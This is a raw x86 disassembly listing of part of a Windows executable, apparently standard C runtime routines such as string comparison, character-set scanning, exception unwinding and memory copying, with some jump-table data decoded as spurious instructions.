  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
